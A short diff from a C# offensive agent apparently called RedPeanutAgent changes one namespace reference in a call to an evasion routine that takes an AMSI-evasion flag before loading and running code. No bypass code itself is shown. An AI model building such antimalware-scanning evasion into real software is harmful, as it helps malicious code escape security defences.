@@ -91,7 +91,7 @@ namespace RedPeanutAgent
         
         public void LoadAndRun(string[] arguments)
         {
-            Core.Evasion.Evade(amsievasion);
+            RedPeanutAgent.Evasion.Evade(amsievasion);
 
             string reasargs = string.Empty;
             foreach (string s in arguments)
